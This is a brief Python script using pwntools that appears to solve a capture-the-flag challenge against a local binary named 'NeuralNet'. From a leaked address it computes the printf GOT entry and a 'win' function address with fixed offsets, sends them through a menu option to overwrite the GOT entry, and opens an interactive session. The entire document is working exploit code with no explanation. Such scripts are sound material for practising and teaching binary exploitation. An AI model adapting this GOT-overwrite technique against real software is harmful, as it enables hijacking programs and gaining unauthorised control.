from pwn import *
p=process('./NeuralNet')

sleep(1)
print(p.recv().decode())
predict_outcome=int(input("predict_outcome: "),16)

printf_got=hex(predict_outcome+0x2e2e)
win_addr=hex(predict_outcome-0x59)
p.sendline(b'3')
p.sendline(str(printf_got).encode())
p.sendline(str(win_addr).encode())
p.interactive()
